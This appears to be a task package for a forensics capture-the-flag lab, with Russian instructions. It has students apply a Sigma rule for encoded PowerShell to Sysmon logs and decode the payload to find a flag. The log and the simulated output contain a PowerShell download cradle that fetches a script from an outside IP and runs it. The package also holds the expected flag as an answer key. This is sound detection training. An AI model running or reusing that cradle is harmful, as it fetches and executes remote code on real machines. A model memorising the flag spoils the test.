@@ -1,0 +1,49 @@
+{
+  "id": "forensics-yara-sigma",
+  "workdir": "/home/student/task",
+  "hostname": "lab",
+  "expect": {
+    "file": "/home/student/task/found.txt",
+    "contains": "nto{s1gm4_p0w3rsh3ll_3nc_d3t3ct3d}"
+  },
+  "fs": [
+    {
+      "path": "/home/student/task",
+      "type": "dir"
+    },
+    {
+      "path": "/home/student/task/task.md",
+      "text": "# Задача: от Sigma-правила к обнаружению\n\n`events.log` — выгрузка Sysmon EventID 1 (создание процесса), по одному JSON на\nстроку. Рядом лежит `rule.yml` — Sigma-правило, описывающее подозрительный запуск\nPowerShell с **encoded command** (`-enc`). Твоя цель — применить логику правила к\nсобытиям, найти вредоносный запуск и **декодировать** его payload.\n\nСкрипт `extract.py` повторяет условие Sigma (`Image|endswith powershell.exe` И\n`CommandLine|contains ' -enc '`) и декодирует base64 (это UTF-16LE, как в настоящем\n`-EncodedCommand`). Флаг спрятан в декодированном скрипте.\n\nЗапиши флаг в `found.txt`.\n"
+    },
+    {
+      "path": "/home/student/task/events.log",
+      "text": "{\"EventID\": 1, \"UtcTime\": \"2019-03-14 09:38:01.221\", \"Image\": \"C:\\\\Windows\\\\System32\\\\svchost.exe\", \"CommandLine\": \"C:\\\\Windows\\\\System32\\\\svchost.exe -k netsvcs\", \"User\": \"NT AUTHORITY\\\\SYSTEM\", \"ParentImage\": \"C:\\\\Windows\\\\System32\\\\services.exe\"}\n{\"EventID\": 1, \"UtcTime\": \"2019-03-14 09:39:12.004\", \"Image\": \"C:\\\\Program Files\\\\Google\\\\Chrome\\\\Application\\\\chrome.exe\", \"CommandLine\": \"\\\"C:\\\\Program Files\\\\Google\\\\Chrome\\\\Application\\\\chrome.exe\\\" --type=renderer\", \"User\": \"CORP\\\\alice\", \"ParentImage\": \"C:\\\\Program Files\\\\Google\\\\Chrome\\\\Application\\\\chrome.exe\"}\n{\"EventID\": 1, \"UtcTime\": \"2019-03-14 09:41:07.555\", \"Image\": \"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\", \"CommandLine\": \"powershell.exe -nop -w hidden -enc JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAOwAkAGMALgBIAGUAYQBkAGUAcgBzAC4AQQBkAGQAKAAnAFUAcwBlAHIALQBBAGcAZQBuAHQAJwAsACcATQBvAHoAaQBsAGwAYQAvADUALgAwACcAKQA7ACQAcwA9ACQAYwAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADgANQAuADIAMgAwAC4AMQAwADEALgA0AC8AdQAuAHAAcwAxACcAKQA7AEkARQBYACAAJABzADsAIwAgAG4AdABvAHsAcwAxAGcAbQA0AF8AcAAwAHcAMwByAHMAaAAzAGwAbABfADMAbgBjAF8AZAAzAHQAMwBjAHQAMwBkAH0A\", \"User\": \"CORP\\\\alice\", \"ParentImage\": \"C:\\\\Windows\\\\explorer.exe\"}\n{\"EventID\": 1, \"UtcTime\": \"2019-03-14 09:42:33.900\", \"Image\": \"C:\\\\Windows\\\\System32\\\\notepad.exe\", \"CommandLine\": \"notepad.exe C:\\\\Users\\\\alice\\\\Desktop\\\\notes.txt\", \"User\": \"CORP\\\\alice\", \"ParentImage\": \"C:\\\\Windows\\\\explorer.exe\"}\n{\"EventID\": 1, \"UtcTime\": \"2019-03-14 09:44:02.117\", \"Image\": \"C:\\\\Windows\\\\System32\\\\cmd.exe\", \"CommandLine\": \"cmd.exe /c whoami\", \"User\": \"CORP\\\\alice\", \"ParentImage\": \"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\"}\n{\"EventID\": 1, \"UtcTime\": \"2019-03-14 09:45:50.640\", \"Image\": \"C:\\\\Program Files\\\\Microsoft Office\\\\root\\\\Office16\\\\WINWORD.EXE\", \"CommandLine\": \"WINWORD.EXE /n C:\\\\Users\\\\alice\\\\Documents\\\\report.docx\", \"User\": \"CORP\\\\alice\", \"ParentImage\": \"C:\\\\Windows\\\\explorer.exe\"}\n"
+    },
+    {
+      "path": "/home/student/task/rule.yml",
+      "text": "title: Suspicious PowerShell Encoded Command\nid: 8a3f6c2e-1b44-4f0a-9c2d-7e5b1a0d3f91\nstatus: experimental\ndescription: Detects process creation of PowerShell with an encoded (-enc/-EncodedCommand) payload.\nlogsource:\n  product: windows\n  service: sysmon\ndetection:\n  selection_img:\n    Image|endswith: '\\\\powershell.exe'\n  selection_cli:\n    CommandLine|contains:\n      - ' -enc '\n      - ' -EncodedCommand '\n      - ' -e '\n  condition: selection_img and selection_cli\nfields:\n  - UtcTime\n  - User\n  - CommandLine\nfalsepositives:\n  - Legitimate administrative scripts that use -enc\nlevel: high\n"
+    },
+    {
+      "path": "/home/student/task/extract.py",
+      "text": "#!/usr/bin/env python3\n# Convert the Sigma rule's detection logic to a filter over events.log and\n# decode any PowerShell encoded command (base64 of UTF-16LE).\nimport json, base64, re, sys\n\ndef sigma_match(ev):\n    img = (ev.get(\"Image\") or \"\").lower()\n    cli = ev.get(\"CommandLine\") or \"\"\n    if not img.endswith(\"powershell.exe\"):\n        return False\n    return (\" -enc \" in \" \"+cli+\" \") or (\" -encodedcommand \" in cli.lower()) or (\" -e \" in \" \"+cli+\" \")\n\ndef decode(cli):\n    m = re.search(r\"-e(?:nc(?:odedcommand)?)?\\s+([A-Za-z0-9+/=]{20,})\", cli)\n    if not m:\n        return None\n    raw = base64.b64decode(m.group(1))\n    try:\n        return raw.decode(\"utf-16-le\")\n    except UnicodeDecodeError:\n        return raw.decode(\"latin-1\")\n\nhits = 0\nfor line in open(\"events.log\", encoding=\"utf-8\"):\n    line = line.strip()\n    if not line:\n        continue\n    ev = json.loads(line)\n    if sigma_match(ev):\n        hits += 1\n        print(\"MATCH  %s  user=%s\" % (ev[\"UtcTime\"], ev[\"User\"]))\n        print(\"  cmd : %s\" % ev[\"CommandLine\"][:80])\n        payload = decode(ev[\"CommandLine\"])\n        if payload:\n            print(\"  decoded payload:\")\n            for l in payload.splitlines():\n                print(\"    \" + l)\nprint(\"sigma matches: %d\" % hits)\n"
+    }
+  ],
+  "tools": {
+    "python3": {
+      "help": "python3 <скрипт.py> — интерпретатор Python (вывод захвачен из реального запуска)",
+      "cases": [
+        {
+          "match": "--version|^-V$",
+          "example": "python3 --version",
+          "output": "Python 3.12.4"
+        },
+        {
+          "match": "extract\\.py",
+          "example": "python3 extract.py",
+          "output": "MATCH  2019-03-14 09:41:07.555  user=CORP\\alice\n  cmd : powershell.exe -nop -w hidden -enc JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0A\n  decoded payload:\n    $c=New-Object Net.WebClient;$c.Headers.Add('User-Agent','Mozilla/5.0');$s=$c.DownloadString('http://185.220.101.4/u.ps1');IEX $s;# nto{s1gm4_p0w3rsh3ll_3nc_d3t3ct3d}\nsigma matches: 1\n"
+        }
+      ],
+      "fallback": "python3: доступно `python3 extract.py`\n"
+    }
+  }
+}
